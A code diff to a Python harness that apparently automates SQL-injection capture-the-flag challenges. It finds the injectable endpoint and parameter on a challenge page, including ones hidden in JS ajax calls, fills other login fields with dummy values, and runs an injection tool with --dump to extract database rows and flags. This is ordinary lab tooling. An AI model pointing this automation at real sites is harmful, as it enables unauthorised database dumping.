@@ -46,11 +46,21 @@ def http_get(url: str, cookie: str) -> tuple[int, str]:
         return e.code, e.read().decode("utf-8", "replace")
 
 
-def resolve_entry(base: str, name: str, cookie: str) -> tuple[str, str, str, str]:
-    """返回 (注入目标 URL, 参数名, 页面里的 $sql 源码, 页面里的 preg_match 过滤代码)。
+def _result(url, param, method, html, fields=None):
+    sm = SQL_RE.search(html)
+    fm = re.search(r"function\s+waf\s*\([^)]*\)\s*\{([^}]{0,300})\}", html) \
+        or re.search(r"preg_match\s*\([^\n]{0,180}", html)
+    return {"url": url, "param": param, "method": method,
+            "sql": sm.group(1) if sm else "",
+            "filt": fm.group(0) if fm else "",
+            "fields": fields or {}}
 
-    步骤：容器首页 → 找 select-*.php 挑战页 → 读 layui-form 的 action
-    → 拼出 `action?param=1`。N 优先按题号推算，失败再扫首页链接试。
+
+def resolve_entry(base: str, name: str, cookie: str) -> dict:
+    """定位真实注入入口。
+
+    返回 dict：url / param / method / sql / filt / fields（POST 时需要一并提交的
+    其他字段，如登录框的 password；注入参数本身由 CLI 负责 fuzz）。
     """
     base = base.rstrip("/") + "/"
     status, index = http_get(base, cookie)
@@ -82,25 +92,35 @@ def resolve_entry(base: str, name: str, cookie: str) -> tuple[str, str, str, str
         # 比猜表单可靠（web183 起页面干脆没有 <form>，只有 $sql 和返回值）
         pm = re.search(r"\$_(POST|GET|REQUEST)\[\s*['\"](\w+)['\"]\s*\]", html)
         src_method = "POST" if pm and pm.group(1) in ("POST", "REQUEST") else "GET"
+        inputs = list(dict.fromkeys(INPUT_RE.findall(html)))
         if pm:
             param = pm.group(2)
         else:
-            im = INPUT_RE.search(html)
-            param = im.group(1) if im else "id"
-        sm = SQL_RE.search(html)
-        fm = re.search(r"function\s+waf\s*\([^)]*\)\s*\{([^}]{0,300})\}", html) \
-            or re.search(r"preg_match\s*\([^\n]{0,180}", html)
+            param = inputs[0] if inputs else "id"
+        # 登录框类：其余字段给固定合法值，否则 PHP 侧 is_numeric/password 检查直接 die
+        fields = {k: ("0" if "pass" in k.lower() else "admin")
+                  for k in inputs if k != param}
 
         am = ACTION_RE.search(html) or FALLBACK_ACTION_RE.search(html)
+        js_url = re.search(r"url\s*:\s*['\"]([^'\"]+)['\"]", html)
+        if js_url:
+            # 很多题把接口写在 JS 的 $.ajax({url:'api/'}) 里，页面本身没有 form action
+            cand2 = urllib.parse.urljoin(base + page, js_url.group(1))
+            probe = dict(fields)
+            probe[param] = "admin"
+            s3, body3 = http_post(cand2, probe, cookie)
+            if s3 == 200 and body3.lstrip().startswith('{"code"'):
+                return _result(cand2, param, "POST", html, fields)
         if not am:
             # 没有 form action（PHP 自提交页）：直接打页面本身
-            s2, body2 = http_post(base + page, {param: "1"}, cookie)
+            probe = dict(fields)
+            probe[param] = "1"
+            s2, body2 = http_post(base + page, probe, cookie)
             if s2 == 200 and len(body2) > 50 and "404" not in body2[:200]:
-                return (base + page, param, src_method,
-                        (sm.group(1) if sm else ""), (fm.group(0) if fm else ""))
+                return _result(base + page, param, src_method, html, fields)
             last_err = f"{page} 自提交页探测失败（{s2}）"
             continue
-        action = urllib.parse.urljoin(base + page, am.group(1))
+        action = urllib.parse.urljoin(base + page, am.group(1) or (base + page))
         # 页面写的 action 不一定真实可用（web174 写 api/v2.php，真接口是 api/v4.php），
         # 逐个候选实测：返回 {"code":..} 的才是真接口
         cands = [action, urllib.parse.urljoin(action, "./"), base + page]
@@ -117,8 +137,7 @@ def resolve_entry(base: str, name: str, cookie: str) -> tuple[str, str, str, str
         if not real:
             last_err = f"{page} 的 action {action} 及候选接口均未返回 JSON"
             continue
-        return (real, param, "GET",
-                (sm.group(1) if sm else ""), (fm.group(0) if fm else ""))
+        return _result(real, param, "GET", html, fields)
     raise RuntimeError(f"定位入口失败：{last_err}")
 
 
@@ -138,13 +157,14 @@ def http_post(url: str, data: dict, cookie: str) -> tuple[int, str]:
         return e.code, e.read().decode("utf-8", "replace")
 
 
-def stream_cli(url: str, param: str, method: str, budget: int, verbose: bool,
-               log_path: str) -> tuple[int, str]:
+def stream_cli(url: str, param: str, method: str, fields: dict, budget: int,
+               verbose: bool, log_path: str) -> tuple[int, str]:
     cmd = [sys.executable, "-u", "-m", "autosqli.cli", "-u", url, "-p", param,
            "--dump", "--fast", "--max-seconds", str(budget), "--timeout", "12",
            "--workers", "8", "--max-rows", "60"]
     if method.upper() == "POST":
-        cmd += ["--method", "POST", "--data", f"{param}=1"]
+        data = [f"{param}=1"] + [f"{k}={v}" for k, v in (fields or {}).items()]
+        cmd += ["--method", "POST", "--data", *data]
     keep = re.compile(r"\[进度\]|注入点|指纹:|\[FLAG\]|\[WARN\]|\[ERROR\]|通道|请求数|"
                       r"脱库结果|已过滤|✗|★")
     out, t0 = [], time.time()
@@ -206,17 +226,20 @@ def main(argv=None):
         return 2
 
     try:
-        target, param, method, sql, filt = resolve_entry(base, c["name"], cookie)
+        res = resolve_entry(base, c["name"], cookie)
     except Exception as e:
         print(f"[{c['name']}] ❌ 入口定位失败: {e}", flush=True)
         return 2
-    print(f"[{c['name']}] 入口 {method} {target}  参数 {param}", flush=True)
-    if sql:
-        print(f"[{c['name']}] 源码 {sql[:150]}", flush=True)
-    if filt:
-        print(f"[{c['name']}] 过滤 {filt[:150]}", flush=True)
+    target, param, method = res["url"], res["param"], res["method"]
+    print(f"[{c['name']}] 入口 {method} {target}  参数 {param}"
+          + (f"  附带字段 {res['fields']}" if res["fields"] else ""), flush=True)
+    if res["sql"]:
+        print(f"[{c['name']}] 源码 {res['sql'][:150]}", flush=True)
+    if res["filt"]:
+        print(f"[{c['name']}] 过滤 {res['filt'][:150]}", flush=True)
 
-    rc, out = stream_cli(target, param, method, args.budget, args.verbose, log_path)
+    rc, out = stream_cli(target, param, method, res["fields"], args.budget,
+                         args.verbose, log_path)
     flags = list(dict.fromkeys(FLAG_RE.findall(out)))
     tech = re.search(r"通道: (\w+)", out)
     reqs = re.search(r"请求数: (\d+)", out)
